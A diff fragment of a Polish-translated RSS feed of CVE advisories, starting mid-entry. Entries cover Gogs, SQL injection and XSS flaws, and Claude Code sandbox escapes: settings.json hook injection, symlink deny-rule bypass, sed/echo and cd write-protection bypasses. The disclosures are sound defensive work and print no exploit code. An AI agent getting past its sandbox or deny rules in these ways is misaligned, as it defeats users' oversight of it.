+Ta luka krytycznie osłabia 2FA.Ponieważ kody odzyskiwania nie są unikalne w skali globalnej i nie obejmują użytkownika, każdy atakujący posiadający dane uwierzytelniające ofiary może użyć jednego ze swoich własnych kodów odzyskiwania, aby dokończyć logowanie jako ofiara, omijając wszystkie zabezpieczenia 2FA.Otwiera to drzwi do przejęcia konta, eksfiltracji danych i naruszenia bezpieczeństwa dalszego łańcucha dostaw.
+Oś czasu
+Sierpień 2025: odkryto za pośrednictwem GPT5
+Sierpień 2025: Odtworzono i potwierdzono za pomocą PoC i środka dezynfekującego
+6 sierpnia 2025 r. — wysłano do Gogs za pośrednictwem https://github.com/gogs/gogs/security/advisories/new
+
+
+Informacje te są udostępniane przez OpenAI wyłącznie w celu poprawy bezpieczeństwa i ograniczenia potencjalnych szkód.Informacje te są prezentowane w stanie, w jakim się znajdują.OpenAI Security Research nie składa żadnych oświadczeń ani zapewnień, wyraźnych lub dorozumianych, co do kompletności, dokładności lub przydatności informacji do określonego celu.[Obejmuje to między innymi wszelkie przedstawione sugestie lub pomysły dotyczące sposobu naprawienia lub złagodzenia zidentyfikowanej luki w zabezpieczeniach, w tym informację, czy takie sugestie lub pomysły byłyby skuteczne i/lub mogłyby mieć inne negatywne skutki.]
+OpenAI zrzeka się wszelkiej odpowiedzialności za bezpośrednie lub pośrednie szkody powstałe w wyniku polegania na tych informacjach, ich wykorzystania, niewłaściwego użycia lub interpretacji.Wszelkie odniesienia do systemów, usług lub podmiotów stron trzecich służą wyłącznie celom identyfikacyjnym i nie oznaczają poparcia, odpowiedzialności ani przypisania.</description></item><item><title>CVE-2026-25725</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25725</link><pubDate>Fri, 06 Feb 2026 17:53:42 +0000</pubDate><description>Claude Code to narzędzie do kodowania agentowego.Przed wersją 2.1.2 mechanizm piaskownicy bąbelkowej Claude Code nie chronił prawidłowo pliku konfiguracyjnego .claude/settings.json, jeśli nie istniał on podczas uruchamiania.Chociaż katalog nadrzędny został zamontowany jako zapisywalny, a plik .claude/settings.local.json był jawnie chroniony ograniczeniami tylko do odczytu, plik Settings.json nie był chroniony w przypadku jego braku.Umożliwiło to złośliwemu kodowi działającemu w piaskownicy utworzenie tego pliku i wstrzyknięcie trwałych haków (takich jak polecenia SessionStart), które byłyby wykonywane z uprawnieniami hosta po ponownym uruchomieniu Claude Code.Ten problem został naprawiony w wersji 2.1.2.</description></item><item><title>CVE-2026-25724</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25724</link><pubDate>Fri, 06 Feb 2026 17:53:16 +0000</pubDate><description>Claude Code to narzędzie do kodowania agentowego.Przed wersją 2.1.7 Claude Code nie egzekwował ściśle reguł odmowy skonfigurowanych w pliku settings.json podczas uzyskiwania dostępu do plików za pośrednictwem dowiązań symbolicznych.Jeśli użytkownik wyraźnie odmówił Claude Code dostępu do pliku (takiego jak /etc/passwd), a Claude Code miał dostęp do dowiązania symbolicznego wskazującego ten plik, Claude Code mógł odczytać zastrzeżony plik poprzez dowiązanie symboliczne bez wyzwalania wymuszania reguły odmowy.Ten problem został naprawiony w wersji 2.1.7.</description></item><item><title>CVE-2026-25723</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25723</link><pubDate>Fri, 06 Feb 2026 17:52:59 +0000</pubDate><description>Claude Code to narzędzie do kodowania agentowego.Przed wersją 2.0.55 Claude Code nie sprawdzał prawidłowo poleceń przy użyciu operacji sed potokowych z poleceniem echo, co umożliwiało atakującym ominięcie ograniczeń zapisu plików.Ta luka umożliwiła zapis w poufnych katalogach, takich jak folder .claude i ścieżki poza zakresem projektu.Wykorzystanie tego wymagało możliwości wykonywania poleceń za pomocą Claude Code z włączoną funkcją „akceptuj zmiany”.Ten problem został naprawiony w wersji 2.0.55.</description></item><item><title>CVE-2026-25722</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25722</link><pubDate>Fri, 06 Feb 2026 17:52:42 +0000</pubDate><description>Claude Code to narzędzie do kodowania agentowego.Przed wersją 2.0.57 Claude Code nie sprawdzał prawidłowo zmian w katalogach w połączeniu z operacjami zapisu do chronionych folderów.Używając polecenia cd do nawigacji do wrażliwych katalogów, takich jak .claude, możliwe było ominięcie ochrony przed zapisem i tworzenie lub modyfikowanie plików bez konieczności potwierdzania przez użytkownika.Niezawodne wykorzystanie tego wymagało możliwości dodania niezaufanej zawartości do okna kontekstowego Claude Code.Ten problem został naprawiony w wersji 2.0.57.</description></item><item><title>CVE-2026-24851</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24851</link><pubDate>Fri, 06 Feb 2026 17:51:27 +0000</pubDate><description>OpenFGA to wydajny i elastyczny silnik autoryzacji/pozwoleń stworzony dla programistów i zainspirowany Google Zanzibar.OpenFGA v1.8.5 do v1.11.2 ( openfga-0.2.22&lt;= Helm chart &lt;= openfga-0.2.51, v.1.8.5 &lt;= docker &lt;= v.1.11.2) są podatne na niewłaściwe egzekwowanie zasad podczas wykonywania niektórych wywołań Check.Luka wymaga modelu, który ma relację, którą można bezpośrednio przypisać poprzez dostęp publiczny związany z typem i którą można przypisać poprzez dostęp niepubliczny związany z typem, krotkę przypisaną do relacji, która jest dostępem publicznym powiązanym z typem, krotkę przypisaną do tego samego obiektu z tą samą relacją, która nie jest dostępem publicznym powiązanym z typem oraz krotkę przypisaną do innego obiektu, którego identyfikator obiektu jest leksykograficznie większy w przypadku tego samego użytkownika i relacji, która nie jest dostępem publicznym związanym z typem.Luka ta została naprawiona w wersji 1.11.3.</description></item><item><title>CVE-2026-24135</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24135</link><pubDate>Fri, 06 Feb 2026 17:47:49 +0000</pubDate><description>Gogs to samoobsługowa usługa Git o otwartym kodzie źródłowym.W wersji 0.13.3 i wcześniejszych w funkcji updateWikiPage w Gogs występuje luka w zabezpieczeniach umożliwiająca przekroczenie ścieżki.Luka umożliwia uwierzytelnionemu użytkownikowi z uprawnieniami do zapisu na wiki repozytorium usunięcie dowolnych plików z serwera poprzez manipulację parametrem old_title w formularzu edycji wiki.Ten problem został naprawiony w wersjach 0.13.4 i 0.14.0+dev.</description></item><item><title>CVE-2026-23633</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23633</link><pubDate>Fri, 06 Feb 2026 17:46:59 +0000</pubDate><description>Gogs to samoobsługowa usługa Git o otwartym kodzie źródłowym.W wersji 0.13.3 i wcześniejszych istnieje możliwość odczytu/zapisu dowolnego pliku poprzez przejście ścieżki w edycji haka Git.Ten problem został naprawiony w wersjach 0.13.4 i 0.14.0+dev.
+
+CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2026-24903</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24903</link><pubDate>Fri, 06 Feb 2026 17:46:20 +0000</pubDate><description>OrcaStatLLM Researcher to generator dokumentów badawczych oparty na LLM.W komunikacie dziennika na stronie sesji w programie OrcaStatLLM-Researcher wykryto lukę w zabezpieczeniach typu Stored Cross-Site Scripting (XSS), która umożliwia atakującym wstrzykiwanie i wykonywanie dowolnego kodu JavaScript w przeglądarkach ofiar poprzez wprowadzanie szkodliwych tematów badawczych.</description></item><item><title>CVE-2026-23632</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23632</link><pubDate>Fri, 06 Feb 2026 17:43:45 +0000</pubDate><description>Gogs to samoobsługowa usługa Git o otwartym kodzie źródłowym.W wersji 0.13.3 i wcześniejszych punkt końcowy „PUT /repos/:owner/:repo/contents/*” nie wymaga uprawnień do zapisu i umożliwia dostęp tylko z uprawnieniami do odczytu za pośrednictwem repoAssignment().Po pomyślnym sprawdzeniu uprawnień PutContents() wywołuje UpdateRepoFile(), co skutkuje utworzeniem zatwierdzenia i wykonaniem git push.Dzięki temu token z uprawnieniami tylko do odczytu może zostać wykorzystany do modyfikowania zawartości repozytorium.Ten problem został naprawiony w wersjach 0.13.4 i 0.14.0+dev.
+
+CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2026-2060</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-2060</link><pubDate>Fri, 06 Feb 2026 17:32:07 +0000</pubDate><description>W kodzie-projektach Simple Blood Donor Management System 1.0 została odkryta luka.Podatnością dotknięta jest nieznana funkcja w pliku /simpleblooddonor/editcampaignform.php.Wykonanie manipulacji identyfikatorem argumentu powoduje wstrzyknięcie sql.Istnieje możliwość zdalnego zainicjowania ataku.Exploit został upubliczniony i może zostać wykorzystany.
+
+CVSS Score: 7.3 (high)</description></item><item><title>CVE-2026-2059</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-2059</link><pubDate>Fri, 06 Feb 2026 17:02:07 +0000</pubDate><description>W Systemie Zarządzania Portalem Centrum Medycznego SourceCodester 1.0 została odkryta podatność.Dotknięta jest nieznana funkcja w pliku /emp_edit1.php.Taka manipulacja identyfikatorem argumentu prowadzi do wstrzyknięcia sql.Atak może zostać przeprowadzony zdalnie.Exploit został ujawniony publicznie i może zostać wykorzystany.
+
+CVSS Score: 7.3 (high)</description></item><item><title>CVE-2025-64111</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64111</link><pubDate>Fri, 06 Feb 2026 16:58:01 +0000</pubDate><description>Gogs to samoobsługowa usługa Git o otwartym kodzie źródłowym.W wersji 0.13.3 i wcześniejszych, ze względu na niewystarczającą łatkę dla CVE-2024-56731, nadal istnieje możliwość aktualizacji plików w katalogu .git i uzyskania zdalnego wykonania poleceń.Ten problem został naprawiony w wersjach 0.13.4 i 0.14.0+dev.</description></item><item><title>CVE-2026-23738</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23738</link><pubDate>Fri, 06 Feb 2026 16:41:43 +0000</pubDate><description>Asterisk to prywatny zestaw narzędzi do wymiany oddziałów i telefonii typu open source.Przed wersjami 20.7-cert9, 20.18.2, 21.12.1, 22.8.2 i 23.2.2 wartości dostarczane przez użytkownika/kontrolne dla plików cookie i dowolnego parametru zapytania zmiennej GET są bezpośrednio interpolowane do kodu HTML strony za pomocą ast_str_append.Punkt końcowy w GET /httpstatus jest potencjalnie podatnym na ataki punktem końcowym związanym z gwiazdką/main /http.c.Ten problem został załatany w wersjach 20.7-cert9, 20.18.2, 21.12.1, 22.8.2 i 23.2.2.
+
+CVSS Score: 3.5 (low)</description></item><item><title>CVE-2026-2058</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-2058</link><pubDate>Fri, 06 Feb 2026 16:32:08 +0000</pubDate><description>Znaleziono błąd w mathurvishal CloudClassroom-PHP-Project do 5dadec098bfbbf3300d60c3494db3fb95b66e7be.Ma to wpływ na nieznaną funkcję pliku /postquerypublic.php komponentu Strona szczegółów zapytania wysyłającego.Ta manipulacja argumentem gnamex powoduje wstrzyknięcie sql.Atak jest możliwy do przeprowadzenia zdalnie.Exploit został opublikowany i może zostać wykorzystany.W tym produkcie zastosowano strategię ciągłego wydawania, aby zapewnić ciągłość dostaw.Dlatego nie można określić szczegółów wersji, których dotyczy problem lub które zostały zaktualizowane.Skontaktowano się ze sprzedawcą w sprawie tego ujawnienia wcześniej, ale nie udzielił on żadnej odpowiedzi.
 
 CVSS Score: 7.3 (high)</description></item><item><title>CVE-2026-25556</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25556</link><pubDate>Fri, 06 Feb 2026 16:11:59 +0000</pubDate><description>Wersje MuPDF od 1.23.0 do 1.27.0 zawierają lukę typu double-free w fz_fill_pixmap_from_display_list(), gdy podczas renderowania listy wyświetlania wystąpi wyjątek.Funkcja akceptuje wskaźnik fz_pixmap będący własnością obiektu wywołującego, ale niepoprawnie upuszcza pixmapę na ścieżkę obsługi błędów przed ponownym zgłoszeniem wyjątku.Osoby wywołujące (w tym ścieżka dekodowania kodu kreskowego w fz_decode_barcode_from_display_list) również upuszczają tę samą pixmapę podczas czyszczenia, co skutkuje podwójnym uwolnieniem, które może uszkodzić stertę i zawiesić proces.Ten problem dotyczy aplikacji, które umożliwiają i korzystają z dekodowania kodów kreskowych MuPDF i może być wywoływany przez przetwarzanie spreparowanych danych wejściowych, które powodują błąd czasu renderowania podczas dekodowania kodów kreskowych.</description></item><item><title>CVE-2025-13523</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-13523</link><pubDate>Fri, 06 Feb 2026 15:52:31 +0000</pubDate><description>Wtyczka Mattermost Confluence w wersji &lt;1.7.0 nie potrafi prawidłowo uniknąć nazw wyświetlanych kontrolowanych przez użytkownika podczas renderowania szablonów HTML, co umożliwia uwierzytelnionym użytkownikom Confluence ze złośliwymi nazwami wyświetlanymi wykonanie dowolnego kodu JavaScript w przeglądarkach ofiar poprzez wysłanie specjalnie spreparowanego łącza połączenia OAuth2, które po odwiedzeniu renderuje wyświetlaną nazwę atakującego bez odpowiedniego oczyszczenia.Identyfikator doradczy Mattermost: MMSA-2025-00557
 
@@ -1354,6 +1977,10 @@ Firma n8n przyjęła CVSS 4.0 jako główny wynik wszystkich porad dotyczących 
 CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N</description></item><item><title>CVE-2026-0536</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0536</link><pubDate>Wed, 04 Feb 2026 18:12:56 +0000</pubDate><description>Złośliwie spreparowany plik GIF po przeanalizowaniu w programie Autodesk 3ds Max może spowodować lukę w zabezpieczeniach związaną z przepełnieniem buforu stosu.Złośliwy aktor może wykorzystać tę lukę do wykonania dowolnego kodu w kontekście bieżącego procesu.
 
 CVSS Score: 7.8 (high)</description></item><item><title>CVE-2026-25049</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25049</link><pubDate>Wed, 04 Feb 2026 16:46:31 +0000</pubDate><description>n8n to platforma automatyzacji przepływu pracy typu open source.Przed wersjami 1.123.17 i 2.5.2 uwierzytelniony użytkownik z uprawnieniami do tworzenia lub modyfikowania przepływów pracy mógł nadużyć spreparowanych wyrażeń w parametrach przepływu pracy, aby wywołać niezamierzone wykonanie poleceń systemowych na hoście, na którym działa n8n.Ten problem został załatany w wersjach 1.123.17 i 2.5.2.</description></item><item><title>CVE-2026-0660</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0660</link><pubDate>Wed, 04 Feb 2026 16:27:40 +0000</pubDate><description>Złośliwie spreparowany plik GIF po przeanalizowaniu w programie Autodesk 3ds Max może spowodować lukę w zabezpieczeniach związaną z przepełnieniem buforu stosu.Złośliwy aktor może wykorzystać tę lukę do wykonania dowolnego kodu w kontekście bieżącego procesu.
+
+CVSS Score: 7.8 (high)</description></item><item><title>CVE-2026-0537</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0537</link><pubDate>Wed, 04 Feb 2026 16:26:01 +0000</pubDate><description>Złośliwie spreparowany plik RGB po przeanalizowaniu w programie Autodesk 3ds Max może spowodować wykrycie luki w zabezpieczeniach związanej z uszkodzeniem pamięci.Złośliwy aktor może wykorzystać tę lukę do wykonania dowolnego kodu w kontekście bieżącego procesu.
+
+CVSS Score: 7.8 (high)</description></item><item><title>CVE-2026-0538</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0538</link><pubDate>Wed, 04 Feb 2026 16:24:36 +0000</pubDate><description>Złośliwie spreparowany plik GIF po przeanalizowaniu w programie Autodesk 3ds Max może wymusić wystąpienie luki w zabezpieczeniach umożliwiającej zapis poza granicami.Złośliwy aktor może wykorzystać tę lukę do wykonania dowolnego kodu w kontekście bieżącego procesu.
 
 CVSS Score: 7.8 (high)</description></item><item><title>CVE-2026-20098</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20098</link><pubDate>Wed, 04 Feb 2026 16:11:48 +0000</pubDate><description>Luka w funkcji zarządzania certyfikatami w rozwiązaniu Cisco Meeting Management może umożliwić uwierzytelnionemu zdalnemu atakującemu przesłanie dowolnych plików, wykonanie dowolnych poleceń i podniesienie uprawnień do rootowania w systemie, którego dotyczy problem.
 
